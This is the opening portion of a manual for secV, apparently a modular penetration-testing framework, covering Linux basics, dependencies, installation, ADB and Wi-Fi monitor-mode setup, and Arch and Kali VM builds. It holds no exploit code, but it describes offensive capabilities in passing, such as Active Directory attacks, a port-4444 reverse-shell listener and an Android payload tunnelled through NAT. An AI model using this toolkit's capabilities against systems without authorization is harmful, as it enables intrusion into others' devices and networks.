<div align="center">

```

   ███████╗███████╗ ██████╗██╗   ██╗                             
   ██╔════╝██╔════╝██╔════╝██║   ██║                             
   ███████╗█████╗  ██║     ██║   ██║                             
   ╚════██║██╔══╝  ██║     ╚██╗ ██╔╝                             
   ███████║███████╗╚██████╗ ╚████╔╝                              
   ╚══════╝╚══════╝ ╚═════╝  ╚═══╝                               

```
### tauri v2.4.3 - The Official Manual

`Go` · `Python` · `Bash` · `Rust` · `C++` - one shell, any language

---

[![Version](https://img.shields.io/badge/v2.4.3-tauri-0d1117?style=flat-square&labelColor=00d9ff&color=0d1117)](https://github.com/secvulnhub/secV)
[![License](https://img.shields.io/badge/MIT-license-0d1117?style=flat-square&labelColor=8b5cf6&color=0d1117)](LICENSE)
[![Go](https://img.shields.io/badge/Go_1.21+-required-0d1117?style=flat-square&labelColor=00ADD8&color=0d1117)](https://golang.org/)
[![Platform](https://img.shields.io/badge/Linux%20%7C%20macOS-0d1117?style=flat-square&labelColor=3a3f4b&color=0d1117)](#)

</div>

---

> This document is the complete secV reference - written for everyone from first-time Linux users to contributors building new modules. It starts at the very beginning and builds up. If you already know the basics, use the table of contents to jump to what you need.

---

## Table of Contents

**Part I - Foundations** (read this if you're new)
- [Chapter 1 - What Is secV?](#chapter-1--what-is-secv)
- [Chapter 2 - What Is a Terminal?](#chapter-2--what-is-a-terminal)
- [Chapter 3 - What Is a Shell?](#chapter-3--what-is-a-shell)
- [Chapter 4 - What Is a Binary / Executable?](#chapter-4--what-is-a-binary--executable)
- [Chapter 5 - What Is stdin and stdout?](#chapter-5--what-is-stdin-and-stdout)
- [Chapter 6 - What Is JSON?](#chapter-6--what-is-json)
- [Chapter 7 - What Is a Port?](#chapter-7--what-is-a-port)
- [Chapter 8 - What Is a Network Protocol?](#chapter-8--what-is-a-network-protocol)
- [Chapter 9 - What Are Dependencies?](#chapter-9--what-are-dependencies)
- [Chapter 10 - What Is a Security Module?](#chapter-10--what-is-a-security-module)

**Part II - Getting secV**
- [Chapter 11 - System Requirements](#chapter-11--system-requirements)
- [Chapter 12 - Installation](#chapter-12--installation)
  - [12.1 - Quick Install (Recommended)](#121--quick-install-recommended)
  - [12.2 - Bare Metal Setup](#122--bare-metal-setup)
  - [12.3 - VM Setup: Arch Linux (Primary)](#123--vm-setup-arch-linux-primary)
  - [12.4 - VM Setup: Kali Linux](#124--vm-setup-kali-linux)
  - [12.5 - VM Setup: Ubuntu / Debian](#125--vm-setup-ubuntu--debian)
  - [12.6 - VM Setup: Fedora](#126--vm-setup-fedora)
- [Chapter 13 - First Run](#chapter-13--first-run)

**Part III - Using secV**
- [Chapter 14 - The secV Shell](#chapter-14--the-secv-shell)
- [Chapter 15 - Running Your First Module](#chapter-15--running-your-first-module)
- [Chapter 16 - Parameters Deep Dive](#chapter-16--parameters-deep-dive)
- [Chapter 17 - Targets and Output](#chapter-17--targets-and-output)

**Part IV - Every Built-in Module**
- [Chapter 18 - netrecon](#chapter-18--netrecon)
- [Chapter 19 - android_pentest](#chapter-19--android_pentest)
- [Chapter 20 - ios_pentest](#chapter-20--ios_pentest)
- [Chapter 21 - adsec](#chapter-21--adsec)
- [Chapter 22 - winadsec](#chapter-22--winadsec)
- [Chapter 23 - websec](#chapter-23--websec)
- [Chapter 24 - wifi_monitor](#chapter-24--wifi_monitor)
- [Chapter 25 - mac_spoof](#chapter-25--mac_spoof)
- [Chapter 26 - revshell](#chapter-26--revshell)
- [Chapter 27 - iot_pwn](#chapter-27--iot_pwn)
- [Chapter 28 - ctfpwn](#chapter-28--ctfpwn)
- [Chapter 29 - badusb](#chapter-29--badusb)

**Part V - How secV Works**
- [Chapter 30 - Architecture](#chapter-30--architecture)
- [Chapter 31 - The JSON Protocol](#chapter-31--the-json-protocol)
- [Chapter 32 - The module.json Manifest](#chapter-32--the-modulejson-manifest)
- [Chapter 33 - The Dependency System](#chapter-33--the-dependency-system)
- [Chapter 34 - The Update System](#chapter-34--the-update-system)

**Part VI - Building Your Own Module**
- [Chapter 35 - Module Structure](#chapter-35--module-structure)
- [Chapter 36 - Your First Python Module](#chapter-36--your-first-python-module)
- [Chapter 37 - Your First Bash Module](#chapter-37--your-first-bash-module)
- [Chapter 38 - Other Languages](#chapter-38--other-languages)
- [Chapter 39 - The module.json Specification](#chapter-39--the-modulejson-specification)
- [Chapter 40 - gen_module.py](#chapter-40--gen_modulepy)
- [Chapter 41 - Testing Your Module](#chapter-41--testing-your-module)
- [Chapter 42 - Contribution Checklist and PR Guide](#chapter-42--contribution-checklist-and-pr-guide)

**Part VII - Reference**
- [Chapter 43 - Shell Command Reference](#chapter-43--shell-command-reference)
- [Chapter 44 - Troubleshooting](#chapter-44--troubleshooting)
- [Chapter 45 - Legal](#chapter-45--legal)

---

# Part I - Foundations

---

## Chapter 1 - What Is secV?

secV is a **security testing framework**. It is one program - called a *loader* or *shell* - that can run any number of separate security tools, called *modules*. Instead of learning a different command-line interface for every tool you use, you learn secV once and it works the same way for everything.

Think of it like a Swiss Army knife. The knife itself is secV. Each blade is a module - a self-contained security tool for a specific task. You pick the blade you need, configure it once, and run it. The interface never changes, regardless of which module you load:

```
secV > use netrecon               # network reconnaissance
secV (netrecon) > set mode deep
secV (netrecon) > run 192.168.1.0/24

secV > use adsec                  # Active Directory attack and audit
secV (adsec) > set operation enumerate_users
secV (adsec) > run 10.0.0.5

secV > use wifi_monitor           # wireless network analysis
secV (wifi_monitor) > set interface wlan0
secV (wifi_monitor) > run

secV > use websec                 # web application testing
secV (websec) > set operation scan_headers
secV (websec) > run https://target.local

secV > use android_pentest        # mobile device security
secV (android_pentest) > set operation apk_static_analysis
secV (android_pentest) > run device

secV > use bitlocker              # Windows full-disk encryption testing
secV (bitlocker) > set operation analyze_volume
secV (bitlocker) > run /dev/sda
```

Every module - network, Active Directory, wireless, web, mobile, Windows, CTF, physical - uses the same three steps: `use`, `set`, `run`.

**Why does this matter?**

Security testing involves dozens of different tools - nmap, metasploit, frida, adb, aircrack, impacket, and more. Every tool has its own syntax, its own flags, its own quirks. New learners spend more time reading man pages than actually testing. Experienced testers lose time switching context between tool ecosystems.

secV gives everything a uniform interface. If you know how to set a parameter and run a module, you know how to use every module in the framework. You can focus on understanding *what* you're testing, not memorising forty different command-line syntaxes.

**What secV is NOT:**

- It is not a hacking tool for unauthorized access. Every operation requires an authorized target - a system you own or have written permission to test.
- It is not magic. It calls the same underlying tools (nmap, metasploit, frida, etc.) that you'd call manually. secV wires them together and gives them a consistent interface.
- It is not finished. secV is actively developed and welcomes contributors. This manual will teach you enough to build your own module by Chapter 36.

---

## Chapter 2 - What Is a Terminal?

A **terminal** (also called a *command line*, *console*, or *command prompt*) is a text-based interface to your computer. Instead of clicking icons, you type text commands and get text back.

On Linux: open `Terminal`, `Konsole`, `Alacritty`, `gnome-terminal`, or any application that says "terminal".

On macOS: open `Applications → Utilities → Terminal`.

When you open a terminal you see something like:

```
user@machine:~$
```

This is called a **prompt**. It tells you who you are (`user`), what computer you're on (`machine`), and where you are in the file system (`~` means your home directory). The `$` means you're a normal user; `#` means root (administrator).

**Navigating the file system in a terminal:**

```bash
pwd          # print working directory - where am I right now?
ls           # list files in the current directory
cd Documents # change directory into Documents
cd ..        # go up one level
cd ~         # go to your home directory
```

You don't need to be a terminal expert to use secV, but you do need to know these basics: how to open a terminal, how to navigate to a directory, and how to run a command.

---

## Chapter 3 - What Is a Shell?

A **shell** is the program that reads what you type in the terminal and executes it. Common shells: `bash` (default on most Linux), `zsh` (default on macOS), `sh` (minimal POSIX shell), `fish`.

When you type `ls` and press Enter, your shell finds the `ls` program, runs it, and shows you the output.

secV is itself a custom shell - a *nested* shell. When you run `./secV`, you drop into the secV shell:

```
secV ❯
```

Now everything you type is interpreted by secV, not by bash. secV knows about modules, parameters, tab completion, and all the commands listed in Chapter 14. When you exit secV with `exit`, you drop back into your regular bash/zsh shell.

**Why a custom shell?**

secV provides tab completion, persistent parameters, module state, output formatting, and dependency checking - things that would be awkward to bolt onto a plain bash script. Putting this in a compiled Go binary means it starts instantly, handles large output without choking, and works identically on any Linux or macOS machine.

---

## Chapter 4 - What Is a Binary / Executable?

When you write code - say, a Python script - it exists as a **source file**: human-readable text. To run it, Python (the interpreter) reads the text and executes it line by line.

A **binary** (or *executable* or *compiled binary*) is different. It has been translated (compiled) from source code into machine instructions - raw numbers that your CPU can execute directly, without any interpreter. Binaries run faster and don't require the original language to be installed.

secV's loader (`./secV` or `/usr/local/bin/secV`) is a compiled Go binary. When you run `./secV`, the operating system loads those machine instructions directly into memory and starts executing. There's no "Go runtime" needed at that point - the binary is self-contained.

The modules secV loads can be written in **any language** - Python scripts, Bash scripts, compiled Go or Rust binaries, Ruby programs, Node.js scripts, C executables. What ties them together is the `module.json` file, which tells secV what command to run, what parameters exist, and what dependencies to check. If the program reads JSON from stdin and writes JSON to stdout, it is a valid secV module. Python and Bash are common because they're fast to write and widely available, which is why they're listed as requirements - but the framework itself imposes no language restriction.

**File permissions:** On Linux/macOS, a file must be *executable* before you can run it. That's what `chmod +x secV` does - it sets the "execute" permission bit on the file.

---

## Chapter 5 - What Is stdin and stdout?

Every program on Linux/macOS has three standard data streams:

| Stream | Number | Purpose |
|--------|--------|---------|
| stdin  | 0 | Input - data the program reads |
| stdout | 1 | Output - data the program writes (normal results) |
| stderr | 2 | Error output - error messages, warnings |

When you run `echo hello`, `hello` goes to stdout, which by default appears in your terminal.

When you run `cat`, the program reads from stdin - it waits for you to type something. Whatever you type goes to stdin.

**Piping** (`|`) connects stdout of one program to stdin of the next:

```bash
echo "hello world" | wc -w    # → 2
```

`echo` sends "hello world" to its stdout. The pipe connects that to `wc`'s stdin. `wc -w` counts the words and prints `2`.

**This is exactly how secV talks to modules.** When you run a module, secV builds a JSON object with the target and parameters, and *writes it to the module's stdin*. The module reads it, does its work, and *writes results to its stdout*. secV reads that stdout, parses the JSON results, and displays them.

This design means modules can be written in any language - as long as they can read stdin and write to stdout (every language can), they work with secV.

---

## Chapter 6 - What Is JSON?

**JSON** (JavaScript Object Notation) is a text format for structured data. It looks like this:

```json
{
  "name": "Alice",
  "age": 30,
  "active": true,
  "scores": [95, 87, 92],
  "address": {
    "city": "London",
    "country": "UK"
  }
}
```

JSON has six data types:

| Type | Example | Description |
|------|---------|-------------|
| String | `"hello"` | Text, always in double quotes |
| Number | `42`, `3.14` | Integers or decimals |
| Boolean | `true`, `false` | True or false |
| null | `null` | Nothing / missing |
| Array | `[1, 2, 3]` | Ordered list of values |
| Object | `{"key": "value"}` | Key-value pairs (a map) |

**Why JSON?** It's human-readable, language-agnostic (every language has a JSON library), and easy to debug by just printing it. When secV sends parameters to a module, it sends them as JSON. When a module sends results back, it sends them as JSON.

**In practice**, you'll see JSON in:
- `module.json` - the module manifest file
- secV's stdin payload to a module
- The module's stdout response
- API responses from web services

You don't need to write JSON by hand often - but you need to understand the structure because error messages and output often show JSON data.

---

## Chapter 7 - What Is a Port?

A **port** is a number from 0 to 65535 that identifies a specific service on a computer.

When you visit `http://example.com`, your browser actually connects to `example.com:80` - port 80 is where web servers listen by default. When you visit `https://example.com`, that's port 443.

Think of a computer's IP address like a building's street address. Ports are the individual apartment numbers. The IP gets you to the building; the port gets you to the right apartment.

**Common well-known ports:**

| Port | Protocol | Service |
|------|----------|---------|
| 21 | TCP | FTP (file transfer) |
| 22 | TCP | SSH (secure shell) |
| 23 | TCP | Telnet (old, insecure shell) |
| 25 | TCP | SMTP (email sending) |
| 53 | TCP/UDP | DNS (domain name resolution) |
| 80 | TCP | HTTP (unencrypted web) |
| 443 | TCP | HTTPS (encrypted web) |
| 445 | TCP | SMB (Windows file sharing) |
| 3306 | TCP | MySQL |
| 3389 | TCP | RDP (Windows remote desktop) |
| 4444 | TCP | Default Metasploit listener |
| 5555 | TCP | ADB over WiFi (Android) |
| 8080 | TCP | Alternative HTTP |
| 8443 | TCP | Alternative HTTPS |

**Port scanning** is the process of connecting to many ports on a target to see which ones are open (a service is listening) versus closed (nothing there) versus filtered (a firewall is blocking it). secV's `netrecon` module does this.

**Listening on a port** means your program is waiting for incoming connections on that port. When you run a reverse shell handler (Chapter 26), secV listens on port 4444 and waits for a target machine to connect back.

---

## Chapter 8 - What Is a Network Protocol?

A **protocol** is an agreed-upon set of rules for how two machines talk to each other. Without a common protocol, one machine's "hello" is meaningless noise to the other.

**TCP** (Transmission Control Protocol) and **UDP** (User Datagram Protocol) are the two transport-layer protocols you'll encounter most:

| | TCP | UDP |
|--|-----|-----|
| Connection | Yes - handshake before data | No - fire and forget |
| Reliability | Guaranteed delivery, in order | No guarantees |
| Speed | Slower (overhead) | Faster |
| Use cases | HTTP, SSH, FTP, anything that needs reliability | DNS, VoIP, video streaming, gaming |

**HTTP** (HyperText Transfer Protocol) is how browsers talk to web servers. A browser sends a *request* (GET /index.html HTTP/1.1), the server sends a *response* (200 OK + page content). HTTPS is the same thing over an encrypted TLS connection.

**SSH** (Secure Shell) is an encrypted protocol for remote command-line access. When you connect to a remote server and type commands, those commands travel over SSH.

**ADB** (Android Debug Bridge) is Android's protocol for communication between a computer and an Android device. It runs over USB cable or over TCP (ADB WiFi mode, port 5555).

**Why protocols matter for security testing:** Every open port runs a protocol. Understanding what protocols do what helps you understand what's exposed, what can go wrong, and what an attacker could do with it.

---

## Chapter 9 - What Are Dependencies?

A **dependency** is another program or library that a piece of software requires in order to work.

secV's loader (the binary itself) has one dependency: Go 1.21+ at *build time*. Once compiled, the binary is self-contained.

secV's modules have their own dependencies. For example:
- `android_pentest` requires `adb` - the Android Debug Bridge command-line tool
- `netrecon` works better with `nmap`, `masscan`, and `rustscan` installed
- `wifi_monitor` requires `aircrack-ng`, `hostapd`, and `hcxdumptool`

**System dependencies** (binaries like `nmap`, `adb`, `aircrack-ng`) are installed via your system's package manager:
```bash
sudo apt install nmap          # Debian/Ubuntu/Kali
sudo pacman -S nmap            # Arch/Manjaro
sudo dnf install nmap          # Fedora/RHEL
```

**Python dependencies** (libraries you import in Python code) are installed via pip:
```bash
pip3 install requests frida-tools impacket
```

**secV checks dependencies automatically.** When you run `info android_pentest`, it tells you which dependencies are installed and which are missing. When a module starts, it checks for required tools and warns you about missing optional ones.

The `install.sh` script handles most dependencies automatically - it detects your distro and installs what's needed. For anything optional, the module tells you what to install and why.

---

## Chapter 10 - What Is a Security Module?

A **security module** in the secV ecosystem is any program that:

1. Reads a JSON object from stdin (target + parameters)
2. Does something security-related
3. Writes a JSON result to stdout

That's it. The module can be written in any language - Python, Bash, Go, Rust, Ruby, Node.js, C, or any language that produces an executable. The only requirement is stdin-to-JSON-in, JSON-to-stdout-out. The `module.json` file describes what to run; the language is irrelevant.

Each module lives in its own directory under `tools/`:

```
tools/
  network/
    netrecon/
      netrecon.py       ← the module executable
      module.json       ← manifest (name, version, parameters, deps)
      README.md         ← module-specific documentation
  mobile/
    android/
      android_pentest.py
      android_gui.py    ← optional: web GUI for this module
      module.json
      README.md
  web/
    websec/
      websec.py
      module.json
      README.md
```

The **manifest** (`module.json`) tells secV everything about the module: what it's called, what parameters it accepts, what dependencies it needs, how to run it, and how long to wait before giving up. When you run `show modules`, secV reads every `module.json` it finds and displays the list.

Building a module means writing a script (in any language), writing a `module.json`, and dropping both into the right directory. Chapter 35–42 walk through this step by step.

---

# Part II - Getting secV

---

## Chapter 11 - System Requirements

The installer (`install.sh`) handles most of this automatically. This table is for reference and for users who want manual control.

**Core (required for the loader)**

| Requirement | Version | Purpose |
|-------------|---------|---------|
| Go | 1.21+ | Compiles the secV binary |
| Python 3 | 3.8+ | Runs all Python modules |
| git | any | secV self-update, CTF repo sync |

**System tools (required per-module)**

| Module | Required system packages |
|--------|-------------------------|
| `netrecon` | `nmap`, `masscan`, `arp-scan` |
| `android_pentest` | `adb`, `apktool`, `msfvenom`, `qrencode`, `nodejs`, `bore` |
| `adsec` | `nmap`, `smbclient`, `rpcclient` |
| `wifi_monitor` | `aircrack-ng`, `hostapd`, `dnsmasq`, `hcxdumptool`, `hcxtools`, `reaver`, `hashcat`, `bettercap` |
| `ios_pentest` | `libimobiledevice`, `ideviceinstaller` |
| `websec` | `ffuf` or `gobuster` |
| `mac_spoof` | `iproute2` (pre-installed) |
| `revshell` | `nc` or `socat` (optional) |
| `ctfpwn` | `nmap`, `gobuster`, `hydra`, `sshpass`, `nodejs` |

**Python packages (optional per-module)**

```bash
pip3 install requests beautifulsoup4 dnspython scapy psutil netifaces \
             frida-tools objection flask websockets cryptography shodan \
             impacket ldap3 paramiko
```

**Quick install for common distros:**

```bash
# Arch / Manjaro / CachyOS
sudo pacman -S go python python-pip git nmap masscan arp-scan \
               gobuster hydra sshpass nodejs aircrack-ng

# Debian / Ubuntu / Kali
sudo apt install golang-go python3 python3-pip git nmap masscan \
                 arp-scan gobuster hydra sshpass nodejs aircrack-ng \
                 libimobiledevice-utils ideviceinstaller android-tools-adb

# Fedora / RHEL
sudo dnf install golang python3 python3-pip git nmap gobuster hydra sshpass nodejs
```

**Optional extras:**

- **rustscan** - fast port scanner: `cargo install rustscan`
- **bore v0.5.1** - NAT bypass tunnel (required for `android_pentest` WAN mode):
  ```bash
  curl -sL https://github.com/ekzhang/bore/releases/download/v0.5.1/bore-v0.5.1-x86_64-unknown-linux-musl.tar.gz | tar xz -C ~/.local/bin
  ```
- **cloudflared** - alternative tunnel for `android_pentest wan_expose`: download from Cloudflare or let the module fall back to bore automatically
- **jadx** - Java decompiler for APK analysis: download from [GitHub releases](https://github.com/skylot/jadx/releases)
- **Shodan API key** - enriches `netrecon` with external intelligence: `pip3 install shodan`, then `set shodan_key YOUR_KEY`
- **Tor** - anonymous routing in `websec`: `sudo apt install tor && sudo systemctl start tor`

---

## Chapter 12 - Installation

### 12.1 - Quick Install (Recommended)

**Standard installation:**

```bash
git clone https://github.com/secvulnhub/secV.git
cd secV
chmod +x install.sh
./install.sh
```

The installer:
1. Detects your Linux distro (Arch, Debian/Ubuntu, Fedora, Alpine) or macOS
2. Installs missing system tools using your package manager
3. Installs Python packages from `rqm.md`
4. Compiles the Go binary (`go build -ldflags="-s -w" -o secV .`)
5. Optionally installs system-wide to `/usr/local/bin/secV` and `/var/lib/secv/`

**File layout after system install:**

| Path | Contents |
|------|----------|
| `/usr/local/bin/secV` | The compiled binary |
| `/var/lib/secv/tools/` | All module directories |
| `/var/lib/secv/update.py` | Self-updater script |
| `~/.secv/cache/` | History file (auto-created on first run) |

**Running without system install (always works):**

```bash
./secV                        # from repo root
```

secV resolves `tools/` in this order:
1. `$SECV_HOME` environment variable (if set)
2. Directory containing the binary (follows symlinks)
3. `/var/lib/secv/`
4. Current working directory

This means you can point secV at any modules directory with:
```bash
SECV_HOME=/custom/path ./secV
```

**Verify installation:**

```bash
./secV --version    # prints version
secV                # if system-installed
secV ❯ show modules # should list all built-in modules
```

---

### 12.2 - Bare Metal Setup

Running secV on a physical machine gives full hardware access - real USB ports for ADB and BadUSB, a physical Wi-Fi card you can put into monitor mode, and bore tunnels through the actual NIC. This section covers everything install.sh does not handle automatically.

**WSL2 is not supported.** WSL2 cannot pass USB devices to ADB, cannot put the host Wi-Fi card into monitor mode, and isolates the network stack. If you are on Windows, install a VM (see 12.3–12.6) or dual-boot.

**Hardware requirements**

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| CPU | x86_64 64-bit, 2 cores | 4+ cores |
| RAM | 4 GB | 8 GB - MSF alone uses ~1 GB at rest |
| Storage | 20 GB free | 50 GB - APK builds, scan logs, media captures |
| Wi-Fi | - | Alfa AWUS036ACH or AWUS036NHA (monitor mode + injection confirmed) |
| USB | 1× USB 2.0+ | 2× ports - ADB on one, BadUSB device on the other |
| OS | Arch / Kali / Ubuntu / Fedora bare metal | CachyOS or Arch (primary dev platform) |

**ADB and USB device permissions**

Without a udev rule, `adb devices` returns empty even with USB debugging enabled on the phone:

```bash
sudo tee /etc/udev/rules.d/51-android.rules <<'EOF'
SUBSYSTEM=="usb", ATTR{idVendor}=="18d1", MODE="0666", GROUP="plugdev"
SUBSYSTEM=="usb", ATTR{idVendor}=="04e8", MODE="0666", GROUP="plugdev"
SUBSYSTEM=="usb", ATTR{idVendor}=="22b8", MODE="0666", GROUP="plugdev"
SUBSYSTEM=="usb", ATTR{idVendor}=="0bb4", MODE="0666", GROUP="plugdev"
SUBSYSTEM=="usb", ATTR{idVendor}=="12d1", MODE="0666", GROUP="plugdev"
SUBSYSTEM=="usb", ATTR{idVendor}=="2717", MODE="0666", GROUP="plugdev"
SUBSYSTEM=="usb", ATTR{idVendor}=="1004", MODE="0666", GROUP="plugdev"
SUBSYSTEM=="usb", ATTR{idVendor}=="0fce", MODE="0666", GROUP="plugdev"
SUBSYSTEM=="usb", ATTR{idVendor}=="2a70", MODE="0666", GROUP="plugdev"
EOF

sudo chmod a+r /etc/udev/rules.d/51-android.rules
sudo udevadm control --reload-rules
sudo udevadm trigger

# Add your user to plugdev - log out and back in after
sudo usermod -aG plugdev $USER
```

install.sh writes this rule automatically if it does not already exist.

**Wi-Fi adapter - enabling monitor mode**

Internal laptop adapters almost never support monitor mode. Use an external USB adapter (Alfa recommended). After plugging in:

```bash
# Find the interface name
ip link show                    # look for wlan0, wlan1, wlp3s0, etc.

# Kill processes that fight for the interface
sudo airmon-ng check kill       # stops NetworkManager and wpa_supplicant

# Place the adapter into monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Confirm
iw dev wlan0 info | grep type   # → type monitor

# Restore managed mode after a session
sudo ip link set wlan0 down
sudo iw dev wlan0 set type managed
sudo ip link set wlan0 up
sudo systemctl restart NetworkManager
```

**Bore - NAT bypass tunnel**

Required for `android_pentest` WAN mode. Without bore, the DexClassLoader payload cannot reach your machine through carrier NAT.

```bash
# Arch / CachyOS - AUR
yay -S bore-cli

# Any distro - Cargo (Rust required)
cargo install bore-cli

# Any distro - pre-built binary (no Rust needed)
curl -L https://github.com/ekzhang/bore/releases/latest/download/bore-x86_64-unknown-linux-musl.tar.gz \
  | tar xz
sudo mv bore /usr/local/bin/bore
bore --version
```

**Metasploit - one-time database initialisation**

MSF requires a PostgreSQL database for session tracking. Initialise it once after installing:

```bash
sudo msfdb init
msfconsole -q -x "version; exit"    # smoke test - must print version and exit cleanly
```

**System-wide install (callable from anywhere)**

```bash
sudo cp secV /usr/local/bin/secV
sudo chmod +x /usr/local/bin/secV
secV --version     # from any directory
```

**Pre-session health check - run this before every operational session**

```bash
# ADB - device must appear here before any android_pentest operation
adb devices

# Wi-Fi - confirm monitor-mode adapter is visible
ip link show && iw dev

# MSF database
sudo msfdb status

# Bore
bore --version

# secV dependency table - ✓/✗ for every module and every dep
./secV -check-deps

# Smoke test - quick localhost recon, must complete in <5 s
echo '{"target":"127.0.0.1","params":{"mode":"quick"}}' \
  | python3 tools/network/netrecon/netrecon.py
```

---

### 12.3 - VM Setup: Arch Linux (Primary)

Arch Linux is the primary secV development and testing platform. CachyOS (a real-time kernel, performance-tuned Arch fork) is what the core team runs. This guide builds a clean Arch VM from the ISO to a working secV installation.

**Create the VM - QEMU/KVM (recommended on Linux hosts)**

```bash
# Install the hypervisor stack if not present
sudo pacman -S qemu-full virt-manager libvirt dnsmasq bridge-utils
sudo systemctl enable --now libvirtd
sudo usermod -aG libvirt,kvm $USER    # log out and back in

# Create the VM
virt-install \
  --name secv-arch \
  --ram 8192 \
  --vcpus 4 \
  --disk size=40,format=qcow2 \
  --cdrom /path/to/archlinux-YYYY.MM.DD-x86_64.iso \
  --os-variant archlinux \
  --network network=default \
  --boot uefi \
  --graphics spice
```

**Create the VM - VirtualBox (cross-platform)**

1. New → Name: `secv-arch`, Type: `Linux`, Version: `Arch Linux (64-bit)`
2. RAM: `8192 MB`, CPU: `4 cores`
3. Disk: `40 GB VDI`, dynamically allocated
4. Settings → Storage → attach the Arch ISO to the optical drive
5. Settings → System → Enable EFI
6. Settings → Network → Adapter 1: `Bridged Adapter` (gives the VM a real LAN IP)
7. Start

**Arch Linux installation (inside the VM)**

```bash
# 1. Verify boot and internet
loadkeys us
ping -c3 archlinux.org        # must succeed - if not, check VM network settings

# 2. Sync clock
timedatectl set-ntp true

# 3. Partition the disk (UEFI layout)
fdisk /dev/vda                # use /dev/sda for VirtualBox
# Inside fdisk:
#   g → create GPT table
#   n → partition 1, +512M → type EFI System  (t → 1)
#   n → partition 2, default (rest) → type Linux filesystem
#   w → write and exit

# 4. Format
mkfs.fat -F32 /dev/vda1
mkfs.ext4 /dev/vda2

# 5. Mount
mount /dev/vda2 /mnt
mkdir -p /mnt/boot/efi
mount /dev/vda1 /mnt/boot/efi

# 6. Install base system
pacstrap /mnt base linux linux-firmware base-devel sudo nano

# 7. Generate fstab
genfstab -U /mnt >> /mnt/etc/fstab

# 8. chroot into the new installation
arch-chroot /mnt

# 9. Set time zone (change Region/City to yours)
ln -sf /usr/share/zoneinfo/America/New_York /etc/localtime
hwclock --systohc

# 10. Locale
echo "en_US.UTF-8 UTF-8" >> /etc/locale.gen
locale-gen
echo "LANG=en_US.UTF-8" > /etc/locale.conf

# 11. Hostname
echo "secv-arch" > /etc/hostname
cat >> /etc/hosts <<'EOF'
127.0.0.1   localhost
::1         localhost
127.0.1.1   secv-arch.localdomain secv-arch
EOF

# 12. Root password and user account
passwd
useradd -m -G wheel,plugdev,audio,video,storage -s /bin/bash $YOUR_USERNAME
passwd $YOUR_USERNAME

# 13. Grant sudo to wheel group
EDITOR=nano visudo
# Uncomment the line:  %wheel ALL=(ALL:ALL) ALL

# 14. GRUB bootloader
pacman -S grub efibootmgr
grub-install --target=x86_64-efi --efi-directory=/boot/efi --bootloader-id=GRUB
grub-mkconfig -o /boot/grub/grub.cfg

# 15. Networking
pacman -S networkmanager
systemctl enable NetworkManager

# 16. Exit chroot and reboot
exit
umount -R /mnt
reboot
```

**Remove the ISO from the VM drive before the reboot.** In virt-manager: Edit → Virtual Machine Details → IDE CDROM → disconnect. In VirtualBox: Settings → Storage → remove the ISO.

**Post-install: secV on Arch**

```bash
# Update and install all secV dependencies in one command
sudo pacman -Syu
sudo pacman -S go python python-pip git nmap masscan android-tools \
               apktool default-jdk metasploit bore jq nodejs \
               aircrack-ng iw wireless_tools imagemagick ffmpeg \
               frida python-requests python-ldap3 python-scapy \
               python-paramiko netexec bloodhound impacket

# One-time MSF database initialisation
sudo msfdb init

# Write the ADB udev rule
sudo tee /etc/udev/rules.d/51-android.rules <<'EOF'
SUBSYSTEM=="usb", ATTR{idVendor}=="18d1", MODE="0666", GROUP="plugdev"
SUBSYSTEM=="usb", ATTR{idVendor}=="04e8", MODE="0666", GROUP="plugdev"
SUBSYSTEM=="usb", ATTR{idVendor}=="22b8", MODE="0666", GROUP="plugdev"
SUBSYSTEM=="usb", ATTR{idVendor}=="0bb4", MODE="0666", GROUP="plugdev"
SUBSYSTEM=="usb", ATTR{idVendor}=="12d1", MODE="0666", GROUP="plugdev"
EOF
sudo udevadm control --reload-rules && sudo udevadm trigger

# Clone and install secV
git clone https://github.com/secvulnhub/secV
cd secV
bash install.sh

# Verify
./secV --version
./secV -check-deps
```

---

### 12.4 - VM Setup: Kali Linux

Kali ships with most offensive tools already installed, making it the fastest path to a working secV environment. The main caveat is that Kali's packaged Go version is often outdated - secV requires Go 1.21+.

**Create the VM**

Same specs as the Arch VM: 4 vCPUs, 8 GB RAM, 40 GB disk. Use QEMU/KVM or VirtualBox with the same settings as 12.3.

**Download:** `kali.org/get-kali` → Installer Images → Kali Linux 64-Bit (Installer)

**Installation (graphical installer)**

1. Boot the ISO → select **Graphical Install**
2. Language: `English` · Location: your country · Keyboard: `English (US)`
3. Hostname: `secv-kali` · Domain: leave blank
4. Full name and username (e.g. `oxbv1`) · set a password
5. Partitioning: **Guided - use entire disk** → All files in one partition
6. Software selection: leave defaults ticked (Kali desktop + top 10 tools)
7. Install GRUB to the primary drive (`/dev/sda` or `/dev/vda`)
8. Finish installation → reboot, remove ISO

**Post-install: secV on Kali**

```bash
sudo apt update && sudo apt full-upgrade -y

# Kali's golang-go is often 1.18 or older - install the official upstream binary
wget -q https://go.dev/dl/go1.21.13.linux-amd64.tar.gz
sudo rm -rf /usr/local/go
sudo tar -C /usr/local -xzf go1.21.13.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc && source ~/.bashrc
go version   # must print go1.21.x or higher

# Install bore (not in apt)
curl -L https://github.com/ekzhang/bore/releases/latest/download/bore-x86_64-unknown-linux-musl.tar.gz \
  | tar xz && sudo mv bore /usr/local/bin/

# MSF is pre-installed on Kali - just init the database
sudo msfdb init
msfconsole -q -x "version; exit"

# ADB udev rule (Kali usually has one but writing it explicitly is safer)
sudo tee /etc/udev/rules.d/51-android.rules <<'EOF'
SUBSYSTEM=="usb", ATTR{idVendor}=="18d1", MODE="0666", GROUP="plugdev"
SUBSYSTEM=="usb", ATTR{idVendor}=="04e8", MODE="0666", GROUP="plugdev"
SUBSYSTEM=="usb", ATTR{idVendor}=="0bb4", MODE="0666", GROUP="plugdev"
EOF
sudo udevadm control --reload-rules && sudo udevadm trigger

# Clone and install secV
git clone https://github.com/secvulnhub/secV
cd secV
bash install.sh

./secV --version
./secV -check-deps
```

---

### 12.5 - VM Setup: Ubuntu / Debian

Ubuntu 24.04 LTS and Debian 12 Bookworm are both supported. The main difference from Kali: you need to install offensive tools that Kali ships by default, and both distros package an old Go that must be replaced.

**Create the VM**

Same specs: 4 vCPUs, 8 GB RAM, 40 GB disk.

Downloads:
- **Ubuntu 24.04 LTS:** `ubuntu.com/download/server` (server ISO is lighter) or desktop ISO
- **Debian 12:** `debian.org/distrib/netinst` - netinstall ISO (~400 MB)

**Installation**

Both use graphical or text installers with the same overall flow:
